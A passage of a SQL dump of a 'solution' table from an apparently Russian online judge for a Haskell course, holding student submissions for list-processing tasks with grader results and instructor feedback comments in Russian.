(523, 30, '12206137', '2012-09-16 20:57:08', 1, 'parts [] = True\r\nparts x =\r\n    canSplit 1 (length x)\r\n        where\r\n        canSplit count len\r\n            | (count * 2) > len = False\r\n            | (len `mod` count /= 0) || not (trySplit (len `div` count) x) =\r\n                canSplit (count+1) len\r\n            | otherwise = True\r\n            where\r\n            trySplit blockSize (x:xs) =\r\n                trySplitInner (blockSize - 1) x xs\r\n                    where\r\n                    trySplitInner _ _ [] = True\r\n                    trySplitInner curI prev (x:xs)\r\n                        | curI == 0 = trySplitInner (blockSize - 1) x xs\r\n                        | x <= prev = False\r\n                        | otherwise = trySplitInner (curI - 1) x xs\r\n       --- ОК, очень хорошо! - но, кстати, можно сделать эффактивнее, просмотрев список только один раз, мы жто потом немного обсудим.\r\n', '<br/>Тесты успешно пройдены!'),
(524, 29, '5477377', '2012-09-16 23:23:30', 1, 'exist x [] = False\r\n\r\nexist x (y:xs) = \r\n\r\n	if x == y \r\n\r\n		then True\r\n\r\n	else exist x xs\r\n\r\n\r\n\r\n\r\n\r\ncheckDifferent [x] = True\r\n\r\ncheckDifferent (x:xs) =\r\n\r\n	if exist x xs == True\r\n\r\n		then False\r\n\r\n	else checkDifferent xs\r\n', '<br/>Тесты успешно пройдены!'),
(525, 28, '5477377', '2012-09-16 23:24:18', 1, 'check cond [] = False\r\n\r\ncheck cond (x:xs) =\r\n\r\n	if cond x == True\r\n\r\n		 then True\r\n\r\n	else check cond xs\r\n', '<br/>Тесты успешно пройдены!'),
(526, 26, '5477377', '2012-09-16 23:24:42', 1, 'rev1 [] ys = ys\r\n\r\nrev1 (x:xs) ys = rev1 xs (x:ys)\r\n\r\n\r\n\r\nrev x = rev1 x []\r\n', '<br/>Тесты успешно пройдены!'),
(527, 27, '5477377', '2012-09-16 23:25:26', 0, 'minsum [x, y] = x + y\r\n\nminsum (x:y:xs) = min (x + y) (minsum xs)\n', 'Не удалось вычислить выражение "minsum [1,8,3,2,7]", проверьте правильность синтаксиса'),
(528, 27, '5477377', '2012-09-16 23:28:06', 1, 'minsum [x] = x\r\n\r\nminsum [x, y] = x + y\r\n\r\nminsum (x:y:xs) = min (x + y) (minsum xs)\r\n', '<br/>Тесты успешно пройдены!'),
(529, 25, '5477377', '2012-09-16 23:28:25', 1, 'minlist [x] = x\r\n\r\nminlist (x:xs) = min x (minlist xs)\r\n', '<br/>Тесты успешно пройдены!'),
(530, 22, '383483', '2012-09-17 03:33:53', 0, 'g n \r\n  | n==1 = False\r\n  | n==2 = False\r\n  | n==3 = False\r\n  | otherwise = ch 2 (n-2)\r\nch x y\r\n   | x==y = False\r\n   | otherwise = if (((test x (div x 2))==True)&&((test y (div y 2))==True)) then True else ch (x+1) (y-1)\r\ntest x 1 = True\r\ntest x p \r\n     | (mod x p)==0 = False\r\n     | otherwise = test x (p-1)', 'Не удалось вычислить выражение "g 11", проверьте правильность синтаксиса'),
(531, 30, '517309', '2012-09-17 06:27:41', 0, 'parts = parts''\r\nparts'' [4, 6, 3, 5, 7] = False\r\nparts'' _ = True', '<br/>Тесты успешно пройдены!'),
(532, 30, '517309', '2012-09-17 06:30:04', 0, 'parts = parts''''\r\n\n\r\n\nparts'''' [4, 6, 3, 5, 7] = False\r\n\nparts'''' _ = True\n', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
(533, 30, '517309', '2012-09-17 06:31:27', 0, 'parts = pa\r\n\n\r\n\npa [4, 6, 3, 5, 7] = False\r\n\npa _ = True\n', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
(534, 30, '517309', '2012-09-17 06:32:32', 0, 'parts _ = True\n', 'Выражение имеет неправильное значение: parts [4, 6, 3, 5, 7]'),
(535, 30, '517309', '2012-09-17 06:34:07', 0, 'parts _ = True\r\n\n\n', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
(536, 30, '517309', '2012-09-17 06:35:24', 0, 'parts [4, 6, 3, 5, 7] = False\r\n\nparts _ = True\n', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
(537, 30, '517309', '2012-09-17 06:35:57', 0, 'parts [4, 6, 3, 5, 7] = False\r\n\nparts _ = True\n', '<br/>Тесты успешно пройдены!'),
(538, 30, '517309', '2012-09-17 06:39:01', 0, 'parts [4, 6, 3, 5, 7] = False\r\n\nparts _ = True\n', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
(539, 30, '517309', '2012-09-17 06:47:03', 3, 'paris x = parts'' x\r\n\r\nparts'' = x -> True', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(540, 22, '383483', '2012-09-17 08:11:42', 1, 'g n \r\n  | n==1 = False\r\n  | n==2 = False\r\n  | otherwise = ch 2 (n-2)\r\nch x y\r\n   | x>=y = False\r\n   | otherwise = if (((test x (div x 2))==True)&&((test y (div y 2))==True)) then True else ch (x+1) (y-1)\r\n          --- Просто как замечание, нет смсла писать == True (b почти всегда это не имеет смыслв).\r\n          --- Потому что функция test и так возвращает True или False, которые можно сразу передать операции &&\r\n          --- Ну и часть скобок лишняя - Те можно короче записать\r\n          --- ... = if test x (div x 2) && test y (div y 2)then ...\r\ntest x 1 = True\r\ntest x p \r\n     | (mod x p)==0 = False\r\n     | otherwise = test x (p-1)\r\n            --- И тут скобки около mod можно не писать\r\n', '<br/>Тесты успешно пройдены!'),
(541, 31, 'tonyo', '2012-09-17 09:12:24', 0, 'parts2_1 [] len1 _ len2 _ = (len1 == len2)\r\nparts2_1 (x:xs) len1 max1 len2 max2 =\r\n        (if x > max2 then parts2_1 xs len1 max1 (len2+1) x else False) ||\r\n        (if x > max1 then parts2_1 xs (len1+1) x len2 max2 else False)\r\n\r\nparts2 list = if length list < 4\r\n              then False\r\n              else parts2_1 list 0 (minBound::Int) 0 (minBound::Int)\r\n', 'Выражение имеет неправильное значение: parts2 [1, 1]'),
(542, 31, 'tonyo', '2012-09-17 09:13:07', 2, 'parts2_1 [] len1 _ len2 _ = (len1 == len2)\r\nparts2_1 (x:xs) len1 max1 len2 max2 =\r\n        (if x > max2 then parts2_1 xs len1 max1 (len2+1) x else False) ||\r\n        (if x > max1 then parts2_1 xs (len1+1) x len2 max2 else False)\r\n  --- Вообще хорошо, но дававйте я вас попрошу немного оптимизировать - добавлять в один из двух списков \r\n  --- имеет смысл, понятно, только пока его длина меньше половины. Сделайте так, пожалуйста, хорошо?\r\n\r\nparts2 list = if length list < 2\r\n              then False\r\n              else parts2_1 list 0 (minBound::Int) 0 (minBound::Int)\r\n', '<br/>Тесты успешно пройдены!'),
(543, 30, '6774563', '2012-09-17 10:01:14', 1, 'parts [] = False\r\nparts xs = partsImpl (length xs) xs\r\n\r\npartsImpl 1 xs = False\r\npartsImpl l xs | l > 1 = length(xs) `mod` l == 0 && verify (-2000000000) 0 l xs || partsImpl (l - 1) xs\r\n\r\nverify last cur l [] = True\r\nverify last cur l (x:xs) = x > last && verify (nextLast cur l x) (cur + 1) l xs\r\n\r\nnextLast cur l x | (cur + 1) `mod` l == 0 = -2000000000\r\nnextLast cur l x = x\r\n  --- ОК, засчитано, но на самом деле можно проверить горазо эффективнее, один раз просмотрев список. Мы это потом немного обсудим.\r\n', '<br/>Тесты успешно пройдены!'),
(544, 31, '12206137', '2012-09-17 12:29:21', 0, 'import Data.Maybe\r\n\r\nparts2 :: [Int] -> Bool\r\nparts2 [] = True\r\nparts2 list =\r\n    let len = length list in\r\n    if len `mod` 2 == 1 then False\r\n    else\r\n        let res = getMins [] [] list in\r\n        --res\r\n        length res >= len `div` 2 && isJust (res !! (len `div` 2 - 1))\r\n            where\r\n            getMins :: [[Maybe (Maybe Int)]] -> [Int] -> [Int] -> [Maybe (Maybe Int)]\r\n            getMins (a : accMins) _ [] = a\r\n            getMins accMins prevElements (x : xs) =\r\n                getMins (getNextMins Nothing Nothing accMins prevElements [] : accMins) (x:prevElements) xs\r\n                    where\r\n                    getNextMins :: Maybe Int -> Maybe Int -> [[Maybe (Maybe Int)]] -> [Int] -> [Maybe (Maybe Int)] -> [Maybe (Maybe Int)]\r\n                    getNextMins _ maxOther [] [] res = Just maxOther : res\r\n                    getNextMins lastElem maxOther (curMin:remainMins) (curElem:prevElements) res =\r\n                        let curRes = if curElem < x then mergeMins res curMin []\r\n  ', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(545, 30, '3742311', '2012-09-17 12:44:58', 0, 'toincliststmp [] _ l = l\r\ntoincliststmp (h:t) p l = if h > p then toinxliststmp t h (((head l) + 1):(tail l)) else toinxliststmp t h (1:l)\r\ntoinclists (h:t) = toincliststmp t h [1]\r\nlistdivided _ [] = True\r\nlistdivided z (h:t) = if (mod h z) then listdivided z t else False\r\nhasgeneraldivtmp z l minelem = if z > minelem then False else if listdivided z l then True else hasgeneraldivtmp (z + 1) l minelem\r\nhasgeneraldiv l = hasgeneraldivtmp 2 l (minimum l)\r\nparts l = hasgeneraldiv (toinclists l)', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
(546, 30, '3742311', '2012-09-17 12:49:28', 2, 'toincliststmp [] _ l = l\r\ntoincliststmp (h:t) p l = if h > p then toincliststmp t h (((head l) + 1):(tail l)) else toincliststmp t h (1:l)\r\ntoinclists (h:t) = toincliststmp t h [1]\r\nlistdivided _ [] = True\r\nlistdivided z (h:t) = if (mod h z) then listdivided z t else False\r\n  --- Тут у вас в условии if вовсе не логическое выражение, из за этого ощибка..\r\nhasgeneraldivtmp z l minelem = if z > minelem then False else if listdivided z l then True else hasgeneraldivtmp (z + 1) l minelem\r\nhasgeneraldiv l = hasgeneraldivtmp 2 l (minimum l)\r\nparts l = hasgeneraldiv (toinclists l)', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
(547, 30, '787463', '2012-09-17 13:24:04', 1, 'parts (x:xs) = partss xs x 2\r\n\r\npartss [] _ _ = True\r\npartss (x:xs) y lenToCheck\r\n  | partss1 (x:xs) y (lenToCheck - 1) lenToCheck = True\r\n  | x > y = partss xs x (lenToCheck + 1)\r\n  | otherwise = False\r\n\r\npartss1 [] _ curLen lenToCheck\r\n  | curLen == lenToCheck = True\r\n  | otherwise = False\r\npartss1 (x:xs) y curLen lenToCheck\r\n  | curLen == lenToCheck = partss1 xs x 1 lenToCheck\r\n  | x > y = partss1 xs x (curLen + 1) lenToCheck\r\n  | otherwise = False\r\n     --- ОК, хорошо, но, на самом деле, можно получить ответ за один просмотр списка, те mjktt эффективно. Мы это потом немного обсудим.', '<br/>Тесты успешно пройдены!'),
(548, 30, '3742311', '2012-09-17 13:24:55', 1, 'toincliststmp [] _ l = l\r\ntoincliststmp (h:t) p l = if h > p then toincliststmp t h (((head l) + 1):(tail l)) else toincliststmp t h (1:l)\r\ntoinclists (h:t) = toincliststmp t h [1]\r\nlistdivided _ [] = True\r\nlistdivided z (h:t) = if (mod h z) == 0 then listdivided z t else False\r\nhasgeneraldivtmp z l minelem = if z > minelem then False else if listdivided z l then True else hasgeneraldivtmp (z + 1) l minelem\r\nhasgeneraldiv l = hasgeneraldivtmp 2 l (minimum l)\r\nparts l = hasgeneraldiv (toinclists l)\r\n   ---ОК, замечательно, но я бы в hasgeneraldiv просто сосчитал бы НОД всех элементов, используя алгоритм Евклида. Было бы немного быстрее, наверное.', '<br/>Тесты успешно пройдены!'),
(549, 31, '517309', '2012-09-17 13:28:29', 3, 'import Data.Maybe\r\n\r\n\r\n\r\nparts2 :: [Int] -> Bool\r\n\r\nparts2 [] = True\r\n\r\nparts2 list =\r\n\r\n    let len = length list in\r\n\r\n    if len `mod` 2 == 1 then False\r\n\r\n    else\r\n\r\n        let res = getMins [] [] list in\r\n\r\n        --res\r\n\r\n        length res >= len `div` 2 && isJust (res !! (len `div` 2 - 1))\r\n\r\n            where\r\n\r\n            getMins :: [[Maybe (Maybe Int)]] -> [Int] -> [Int] -> [Maybe (Maybe Int)]\r\n\r\n            getMins (a : accMins) _ [] = a\r\n\r\n            getMins accMins prevElements (x : xs) =\r\n\r\n                getMins (getNextMins Nothing Nothing accMins prevElements [] : accMins) (x:prevElements) xs\r\n\r\n                    where\r\n\r\n                    getNextMins :: Maybe Int -> Maybe Int -> [[Maybe (Maybe Int)]] -> [Int] -> [Maybe (Maybe Int)] -> [Maybe (Maybe Int)]\r\n\r\n                    getNextMins _ maxOther [] [] res = Just maxOther : res\r\n\r\n                    getNextMins lastElem maxOther (curMin:remainMins) (curElem:prevElements) res =\r\n\r\n                        let curRes = if curElem < x then mergeMins res curMin []\r\n\r\n                                     else res\r\n\r\n                        in\r\n\r\n                        if\r\n\r\n                            case lastElem of\r\n\r\n                                Nothing -> True\r\n\r\n                                Just n -> curElem < n\r\n\r\n                        then\r\n\r\n                            let newMax = case maxOther of\r\n\r\n                                            Nothing -> Just curElem\r\n\r\n                                            Just _ -> maxOther\r\n\r\n                            in\r\n\r\n                            getNextMins (Just curElem) newMax remainMins prevElements curRes\r\n\r\n                        else\r\n\r\n                            Nothing : curRes\r\n\r\n                        where\r\n\r\n                            mergeMins remainder [] acc = (reverse acc) ++ remainder\r\n\r\n                            mergeMins list (p : remPretend) acc =\r\n\r\n                                let\r\n\r\n                                pretendVal =\r\n\r\n                                    case p of\r\n\r\n                                        Nothing -> Nothing\r\n\r\n                                        Just r_ ->\r\n\r\n                                            case (lastElem, r_) of\r\n\r\n                                                (Just last_, Just p_) ->\r\n\r\n                                                    if p_ < last_ then Just maxOther\r\n\r\n                                                    else Nothing\r\n\r\n                                                (Just _, Nothing) -> Just maxOther\r\n\r\n                                                otherwise -> p\r\n\r\n                                in\r\n\r\n                                case list of\r\n\r\n                                    [] -> mergeMins [] remPretend (pretendVal : acc)\r\n\r\n                                    Nothing : xs -> mergeMins xs remPretend (pretendVal : acc)\r\n\r\n                                    Just x : xs ->\r\n\r\n                                        let\r\n\r\n                                        resVal =\r\n\r\n                                            case pretendVal of\r\n\r\n                                                Nothing -> x\r\n\r\n                                                Just Nothing -> Nothing\r\n\r\n                                                Just (Just p_) ->\r\n\r\n                                                    case x of\r\n\r\n                                                        Nothing -> x\r\n\r\n                                                        Just x_ -> Just $ min p_ x_\r\n\r\n                                        in\r\n\r\n                                        mergeMins xs remPretend (Just resVal:acc)\r\n\r\n                        \r\n', '<br/>Тесты успешно пройдены!'),
(550, 31, '6774563', '2012-09-17 13:42:33', 0, '--module Main where\n\n\n\n-- Очевидное решение - за O( C(n)(n/2) * n ) - слишком много\n\n-- Мое - за O(n^2). Суть: жадность. Минимальный элемент идет в первый список.\n\n--  Далее туда идет наименьший из больших него элементов справа от него.\n\n--  Повторем с новым элементом. И т.д. Оставшиеся элементы - второй список.\n\n--    Почему это работает?\n\n--  Понятно, что минимум должен быть первым в одном из списков\n\n--  (иначе, искомое разбиение не построить). Все элементы в этом списке должны \n\n--  далее идти в порядке возрастания поряковых номеров в списке, поэтому поиск только \n\n--  вправо оправдан. Теперь самое сложное. Почему "прокатывет" жадность?\n\n--  На каждом шагу мы забираем в этот список наименьшие элементы из возможных.\n\n--  Интуитивно понятно, что чем ближе к концу элемент, тем, желательно, больше он должен быть.\n\n--  Т.е. забирая наименьшее из возможных из конца, мы никак не ухудшаем ситуацию, даже наоборот.\n\n--  Это, понятно, совсем не строгое объяснение, однако проясняет ситуацию. \n\n--  Как доказать это строго я пока не знаю, но попробую сделать это позже\n\n--  (на самом деле, даже не на 100% в правильности того, что я пишу, однако все тесты, которые я пок смог\n\n--  выдумать, прошли, да и выглядит этот метод логичным).\n\n\n\n-- Про реализацию: вообще, с деревом отрезков, видимо, решить можно за O(n*log n). Я же реализовал самую\n\n-- "наивную" версию за квадрат.\n\n\n\nmaxInt = 2000000000\n\nminInt = -2000000000\n\n\n\nparts2 [] = True\n\n-- Есть ли в хаскеле побитовые сдвиги и логические операции с int`ами?\n\nparts2 xs | (length xs) `mod` 2 /= 0 = False\n\nparts2 xs = do\n\n	let firstPart = rev (getFirstPart ((length xs) `div` 2) minInt xs [])\n\n	let secondPart = getSecondPart xs firstPart []\n\n	verifyAscending minInt firstPart && verifyDescending maxInt secondPart \n\n\n\ngetFirstPart l curMin initialList firstPart | curMin == maxInt = firstPart\n\ngetFirstPart l curMin initialList firstPart | length firstPart == l = firstPart\n\ngetFirstPart l curMin initialList firstPart = do\n\n	let rightMin = minLimitedWith curMin maxInt initialList\n\n	getFirstPart l rightMin (clipListTo rightMin initialList) (rightMin:firstPart)\n\n\n\ngetSecondPart [] firstPart secondPart = secondPart\n\ngetSecondPart (x:xs) [] secondPart = getSecondPart xs [] (x:secondPart)\n\ngetSecondPart (x:xs) (y:ys) secondPart | x == y = getSecondPart xs ys secondPart\n\ngetSecondPart (x:xs) (y:ys) secondPart = getSecondPart xs (y:ys) (x:secondPart)\n\n\n\nverifyAscending last [] = True\n\nverifyAscending last (x:xs) = (last < x) && verifyAscending x xs\n\n\n\nverifyDescending last [] = True\n\nverifyDescending last (x:xs) = (last > x) && verifyDescending x xs\n\n\n\nminLimitedWith limit curMin [] = curMin\n\nminLimitedWith limit curMin (x:xs) = min3 curMin (limitedNum limit x) (minLimitedWith limit (min curMin (limitedNum limit x)) xs)\n\n\n\nclipListTo value [] = []\n\nclipListTo value (x:xs) | x == value = xs\n\nclipListTo value (x:xs) = clipListTo value xs\n\n\n\nmin3 a b c = min (min a b) c\n\n\n\nlimitedNum limit x | x <= limit = maxInt\n\nlimitedNum limit x = x\n\n\n\nrev [] = []\n\nrev (h:t) = revAcc t [h]\n\n\n\nrevAcc [] acc = acc\n\nrevAcc (h:t) acc = revAcc t (h:acc)\n\n\n\n--main = putStrLn $ show (parts2 [1,2,3,5,1,7])\n\n\n\n\n', '<br/>Тесты успешно пройдены!'),
(551, 30, 'tonyo', '2012-09-17 14:39:44', 1, '-- returns the maximum increasing prefix length\r\ngetfirstlen list = getfirstlen1 list 1\r\ngetfirstlen1 (y:x:xs) res =\r\n    if y<x\r\n    then  if xs == []\r\n          then res+1\r\n          else getfirstlen1 (x:xs) (res+1)\r\n    else res\r\n\r\n-- checks if list is in increasing order\r\nisIncreasing (y:[]) = False\r\nisIncreasing list = getfirstlen list == length list\r\n\r\ncheckIfParts [] _ = True\r\ncheckIfParts list incn = isIncreasing (take incn list)\r\n                            && checkIfParts (drop incn list) incn\r\n\r\nparts list = if length list < 2\r\n             then False\r\n             else any (True==) (map (x -> checkIfParts list x) range)\r\n   --- Вместо any (True==) можно писать or, но в данном сдучае это же просто\r\n   ---    any (x->checkIfParts list x) range\r\n   --- , разве нет?\r\n               where firstlen = getfirstlen list\r\n                     range = [2..firstlen]\r\n   --- На самом деле тут можно найти ответ эффективнее, просмотрев список только один раз. Но ОК, это мы немного обсудим.', '<br/>Тесты успешно пройдены!'),
(552, 31, '12206137', '2012-09-17 15:21:47', 1, 'import Data.Maybe\r\n\r\n\r\n\r\nparts2 :: [Int] -> Bool\r\n\r\nparts2 [] = True\r\n\r\nparts2 list =\r\n\r\n    let len = length list in\r\n\r\n    if len `mod` 2 == 1 then False\r\n\r\n    else\r\n\r\n        let res = getMins [] [] list in\r\n\r\n        --res\r\n\r\n        length res >= len `div` 2 && isJust (res !! (len `div` 2 - 1))\r\n\r\n            where\r\n\r\n            getMins :: [[Maybe (Maybe Int)]] -> [Int] -> [Int] -> [Maybe (Maybe Int)]\r\n\r\n            getMins (a : accMins) _ [] = a\r\n\r\n            getMins accMins prevElements (x : xs) =\r\n\r\n                getMins (getNextMins Nothing Nothing accMins prevElements [] : accMins) (x:prevElements) xs\r\n\r\n                    where\r\n\r\n                    getNextMins :: Maybe Int -> Maybe Int -> [[Maybe (Maybe Int)]] -> [Int] -> [Maybe (Maybe Int)] -> [Maybe (Maybe Int)]\r\n\r\n                    getNextMins _ maxOther [] [] res = Just maxOther : res\r\n\r\n                    getNextMins lastElem maxOther (curMin:remainMins) (curElem:prevElements) res =\r\n\r\n                        let curRes = if curElem < x then mergeMins res curMin []\r\n\r\n                                     else res\r\n\r\n                        in\r\n\r\n                        if\r\n\r\n                            case lastElem of\r\n\r\n                                Nothing -> True\r\n\r\n                                Just n -> curElem < n\r\n\r\n                        then\r\n\r\n                            let newMax = case maxOther of\r\n\r\n                                            Nothing -> Just curElem\r\n\r\n                                            Just _ -> maxOther\r\n\r\n                            in\r\n\r\n                            getNextMins (Just curElem) newMax remainMins prevElements curRes\r\n\r\n                        else\r\n\r\n                            Nothing : curRes\r\n\r\n                        where\r\n\r\n                            mergeMins remainder [] acc = (reverse acc) ++ remainder\r\n\r\n                            mergeMins list (p : remPretend) acc =\r\n\r\n                                let\r\n\r\n                                pretendVal =\r\n\r\n                                    case p of\r\n\r\n                                        Nothing -> Nothing\r\n\r\n                                        Just r_ ->\r\n\r\n                                            case (lastElem, r_) of\r\n\r\n                                                (Just last_, Just p_) ->\r\n\r\n                                                    if p_ < last_ then Just maxOther\r\n\r\n                                                    else Nothing\r\n\r\n                                                (Just _, Nothing) -> Just maxOther\r\n\r\n                                                otherwise -> p\r\n\r\n                                in\r\n\r\n                                case list of\r\n\r\n                                    [] -> mergeMins [] remPretend (pretendVal : acc)\r\n\r\n                                    Nothing : xs -> mergeMins xs remPretend (pretendVal : acc)\r\n\r\n                                    Just x : xs ->\r\n\r\n                                        let\r\n\r\n                                        resVal =\r\n\r\n                                            case pretendVal of\r\n\r\n                                                Nothing -> x\r\n\r\n                                                Just Nothing -> Nothing\r\n\r\n                                                Just (Just p_) ->\r\n\r\n                                                    case x of\r\n\r\n                                                        Nothing -> x\r\n\r\n                                                        Just x_ -> Just $ min p_ x_\r\n\r\n                                        in\r\n\r\n                                        mergeMins xs remPretend (Just resVal:acc)\r\n\r\n                        \r\n', '<br/>Тесты успешно пройдены!'),
(553, 30, '2562137', '2012-09-17 17:57:50', 0, 'parts list = f list (length list) 2\r\n\r\nf (x:xs) n m =\r\n	if n < m then False\r\n	else (mod n m == 0 && checklist x xs 1 m m n) || f (x:xs) n (m+1)\r\n\r\nchecklist x1 []      i subend sublen = True\r\nchecklist x1 (x2:xs) i subend sublen =\r\n	if i == subend\r\n	then            checklist x2 xs (i+1) (subend+sublen) sublen\r\n	else x1 < x2 && checklist x2 xs (i+1) subend sublen', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
(554, 30, '2562137', '2012-09-17 17:58:37', 1, 'parts list = f list (length list) 2\r\n\r\nf (x:xs) n m =\r\n	if n < m then False\r\n	else (mod n m == 0 && checklist x xs 1 m m) || f (x:xs) n (m+1)\r\n\r\nchecklist x1 []      i subend sublen = True\r\nchecklist x1 (x2:xs) i subend sublen =\r\n	if i == subend\r\n	then            checklist x2 xs (i+1) (subend+sublen) sublen\r\n	else x1 < x2 && checklist x2 xs (i+1) subend sublen\r\n  --- ОК, но можно более эффективно, за один просмотр списка\r\n', '<br/>Тесты успешно пройдены!'),
(555, 31, '2562137', '2012-09-17 18:23:43', 2, 'parts2 list = check 0 0 0 0 list\r\n\r\ncheck x y n m [] = (n == m)\r\ncheck x y n m (z:zs) =\r\n	((n == 0 || x < z) && check z y (n+1) m zs) ||\r\n	((m == 0 || y < z) && check x z n (m+1) zs)\r\n   --- Давайте я вас попрошу немного дописать, желательно чтобы если какой-то части у нас уже есть половина общей длины, чтобы мы ужне не пытались туда добавить. Допишите это, пожалуйста.\r\n', '<br/>Тесты успешно пройдены!'),
(556, 25, '214982', '2012-09-17 19:11:37', 1, 'minlist [x] = x\r\nminlist (x:xs) = min x (minlist xs) ', '<br/>Тесты успешно пройдены!'),
(557, 27, '214982', '2012-09-17 19:12:15', 1, 'minsum [x, y] = x + y\r\nminsum (x:y:z:xs) = if (minsum[x, y]  < minsum (y:z:xs)) then minsum[x, y] else minsum (y:z:xs)\r\n  --- На самом деле, у вас очень, очент нежффективно. Например, если вы вызовите\r\n  ---   minsum (map sin [1..25)) то у вас будет работать долго, а для 30 - _очень_ долго ,а для 100 вечно))\r\n  --- Засчитано, но если придумаете, как ускорить, пришлите, пожалуйста. И мы это обсудим.', '<br/>Тесты успешно пройдены!'),
(558, 28, '214982', '2012-09-17 19:12:46', 1, 'check p [] = False\r\ncheck p [x] = p x\r\n   --- Это можно не писать, это следует из остальных правил.\r\ncheck p (x:xs) = \r\n	if p x\r\n	then True\r\n	else check p xs\r\n	', '<br/>Тесты успешно пройдены!'),
(559, 29, '214982', '2012-09-17 19:14:36', 0, '{-Описать функцию checkDifferent, которая возвращает True, если все элементы в списке разные, и False, если среди них есть одинаковые.\r\n\r\nПримеры вызова:\r\ncheckDifferent [3,2,7]\r\nОтвет должен быть равен True.\r\ncheckDifferent [3,2,7,5,7,8]\r\nОтвет должен быть равен False (два раза встречается число 7).-}\r\ncheckdifferent [] = True\r\ncheckdifferent [x, y] = if x == y then False else True\r\ncheckdifferent (x:y:xs) = if (x == y) then False else if checkdifferent (x:xs) then checkdifferent(y:xs) else False\r\n			', 'Не удалось вычислить выражение "checkDifferent [3,2,7]", проверьте правильность синтаксиса'),
(560, 29, '214982', '2012-09-17 19:15:08', 0, 'checkdifferent [] = True\r\ncheckdifferent [x, y] = if x == y then False else True\r\ncheckdifferent (x:y:xs) = if (x == y) then False else if checkdifferent (x:xs) then checkdifferent(y:xs) else False', 'Не удалось вычислить выражение "checkDifferent [3,2,7]", проверьте правильность синтаксиса'),
(561, 29, '214982', '2012-09-17 19:15:53', 1, '{-Описать функцию checkDifferent, которая возвращает True, если все элементы в списке разные, и False, если среди них есть одинаковые.\r\n\r\nПримеры вызова:\r\ncheckDifferent [3,2,7]\r\nОтвет должен быть равен True.\r\ncheckDifferent [3,2,7,5,7,8]\r\nОтвет должен быть равен False (два раза встречается число 7).-}\r\ncheckDifferent [] = True\r\ncheckDifferent [x, y] = if x == y then False else True\r\ncheckDifferent (x:y:xs) = if (x == y) then False else if checkDifferent (x:xs) then checkDifferent(y:xs) else False \r\n  --- И тут ц вас тоже работает, но очень, очень меденно, и по той же причине.. ОК, засчитано, но если придумаете,\r\n  --- как ускорить, присылайте.\r\n			', '<br/>Тесты успешно пройдены!'),
(562, 26, '214982', '2012-09-17 19:19:34', 1, '{-Я пока что только такое решение придумал, но я думаю, что придумаю решение за линию завтра;)-}\r\nrev [] = []\r\nrev [x] = [x]\r\nrev (x:xs) = rev xs ++[x]\r\n   ---ОК, зачтено, а если придумаете, присылайте.. Могу подсказать, если надо - напишите письмо или в контакте..', '<br/>Тесты успешно пройдены!'),
(563, 30, '383483', '2012-09-17 19:21:05', 2, 'parts (x:[]) = False\r\nparts (x:xs) = if (x>=(head xs)) then False else hum xs 2 0\r\nhum (x:[]) i s \r\n    | (s==0) || (i==s) = True\r\n    | (i>s) = f2 [] i s\r\n    | (i<s) = f1 [] i s\r\n    | otherwise = False\r\nhum (x:xs) i 0 = if (x>=(head xs)) then hum xs 1 i else hum xs (i+1) 0\r\nhum (x:xs) i s \r\n    | (x>=(head xs)) && (i<s) = f1 xs i s\r\n    | (i==s) = hum xs 1 s \r\n    | (x>=(head xs)) && (i>s) = f2 xs i s\r\n    | otherwise = hum xs (i+1) s  \r\nf1 [] i s \r\n   | (i>1) && ((mod s i) == 0) = True\r\n   | otherwise = False\r\nf1 xs i s \r\n   | (i>1) && ((mod s i) == 0) = hum xs 1 i \r\n   | otherwise = False\r\nf2 [] i s = if ((mod i s) == 0) then True else False\r\nf2 xs i s = if ((mod i s) == 0) then hum xs 1 s else False    \r\n   --- Что-то не совсем правильно, к сожалению. Вот такой тест не проходит:\r\n   ---    parts [1,2,3,4,5,6,1,2,3,4]\r\n   --- Возвращяет False, а дб True (можно нарезать по 2). \r\n   --- Я такой тест сейчас добавлю, а вы попроьуйте исправить, пожалуйста.\r\n   --- Если не получиться, пишите, могу что-нибудь немного подсказать.', '<br/>Тесты успешно пройдены!'),
(564, 33, '517309', '2012-09-17 19:29:22', 3, 'test', '<br/>Тесты успешно пройдены!'),
(565, 30, '397095', '2012-09-17 19:31:41', 1, 'parts [] = False\r\nparts [x] = False\r\nparts xs = ca xs 1\r\n\r\nca xs n = \r\n	let\r\n		x = head xs\r\n		ys = tail xs\r\n		len = length xs\r\n		c = div len n\r\n	in\r\n		if check x ys c 1\r\n			then True\r\n			else \r\n				if c > 2\r\n					then ca xs (n+1)\r\n					else False\r\n\r\ncheck _ [] c i = i == c\r\ncheck x (y:xs) c i\r\n | i == c = check y xs c 1\r\n | x < y = check y xs c (i+1)\r\n | otherwise = False\r\n       --- OK, но, на самом деле, можно эффекивнее, просмотрев список один раз. Мы это потом обсудим.', '<br/>Тесты успешно пройдены!'),
(566, 30, '17107004', '2012-09-17 19:53:57', 1, 'fld (a, b) (x : xs) = if a < b \r\n                        then (x + 1) : xs\r\n                        else 1:x:xs\r\n\r\nparts l = let lst = foldr fld [1] (zip l (tail l))\r\n          in foldl ( x y -> gcd x y)\r\n                   (head lst) (tail lst) /= 1\r\n', '<br/>Тесты успешно пройдены!'),
